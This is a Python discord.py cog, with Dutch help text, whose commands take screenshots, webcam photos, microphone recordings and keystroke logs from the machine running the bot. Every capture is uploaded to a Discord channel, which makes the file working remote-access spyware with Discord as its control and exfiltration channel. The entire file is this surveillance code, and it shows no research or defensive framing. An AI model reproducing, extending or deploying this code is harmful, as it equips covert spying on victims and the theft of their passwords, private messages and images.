from discord.ext import commands
import discord
import pyautogui
import cv2
import sounddevice as sd
from scipy.io.wavfile import write
from pynput import keyboard
import threading
import time
from datetime import datetime
import asyncio

class Media(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.keylogger_active = False
        self.logged_keys = []
        self.listener = None
        self.log_file = "keylog.txt"

    @commands.command(help="Maakt een screenshot van het scherm.")
    async def screenshot(self, ctx):
        filename = "screenshot.png"
        pyautogui.screenshot().save(filename)
        await ctx.send(file=discord.File(filename))

    @commands.command(help="Maakt een foto met de webcam.")
    async def webcam(self, ctx):
        filename = "webcam.jpg"
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            await ctx.send("Webcam kon niet worden geopend.")
            return

        ret, frame = cap.read()
        cap.release()

        if not ret:
            await ctx.send("Kon geen foto maken.")
            return

        cv2.imwrite(filename, frame)
        await ctx.send(file=discord.File(filename))

    @commands.command(help="Neemt 5 seconden audio op.")
    async def microfoon(self, ctx):
        filename = "mic_recording.wav"
        duration = 5
        sample_rate = 44100

        await ctx.send("Opname gestart...")
        recording = sd.rec(
            int(duration * sample_rate),
            samplerate=sample_rate,
            channels=1,
            dtype="int16"
        )
        sd.wait()
        write(filename, sample_rate, recording)

        await ctx.send("Opname klaar!", file=discord.File(filename))

    # KEYLOGGER COMMANDS
    def on_key_press(self, key):
        """Interne functie voor keylogging"""
        try:
            key_str = key.char
        except AttributeError:
            # Speciale toetsen omzetten naar leesbare tekst
            key_str = str(key).replace("Key.", "")
        
        self.logged_keys.append(key_str)

    def stop_keylogger(self):
        """Stop de keylogger listener"""
        if self.listener:
            self.listener.stop()
        self.keylogger_active = False

    @commands.command(help="Logt toetsaanslagen voor X seconden. Gebruik: !keylog 10")
    async def keylog(self, ctx, seconds: int = 10):
        """Log toetsaanslagen lokaal voor een bepaalde tijd"""
        # Beveiligingslimieten
        if seconds > 60:
            await ctx.send("Maximum is 60 seconden!")
            return
        
        if seconds < 1:
            await ctx.send("Minimum is 1 seconde!")
            return
        
        if self.keylogger_active:
            await ctx.send("Keylogger is al actief!")
            return

        # Start keylogger
        self.keylogger_active = True
        self.logged_keys = []
        
        # Start listener
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        
        embed = discord.Embed(
            title="Keylogger Gestart",
            description=f"**Logt toetsaanslagen voor {seconds} seconden...**",
            color=discord.Color.red()
        )
        embed.set_footer(text="Typ nu wat je wilt loggen!")
        await ctx.send(embed=embed)
        
        # Wacht de opgegeven tijd
        await asyncio.sleep(seconds)
        
        # Stop keylogger
        self.stop_keylogger()
        
        # Resultaten verzenden
        if not self.logged_keys:
            await ctx.send("Geen toetsaanslagen gelogd.")
            return
        
        # Alle toetsen aan elkaar plakken als één zin
        sentence = "".join(self.logged_keys)
        
        # Opslaan naar bestand (als één zin)
        with open(self.log_file, "w", encoding="utf-8") as f:
            f.write(sentence)
        
        # Embed maken met de zin
        embed = discord.Embed(
            title="Keylogger Klaar",
            description=f"**{len(self.logged_keys)} toetsaanslagen gelogd:**\n```\n{sentence}\n```",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)

    @commands.command(help="Stopt de keylogger vroegtijdig")
    async def stopkeylog(self, ctx):
        """Stop de keylogger direct"""
        if not self.keylogger_active:
            await ctx.send("Keylogger is niet actief.")
            return
        
        self.stop_keylogger()
        await ctx.send("Keylogger gestopt.")

    @commands.command(help="Wist alle keylogger logs")
    async def clearkeylog(self, ctx):
        """Wis alle logs"""
        self.logged_keys = []
        open(self.log_file, "w").close()
        await ctx.send("Alle logs gewist!")

async def setup(bot):
    await bot.add_cog(Media(bot))
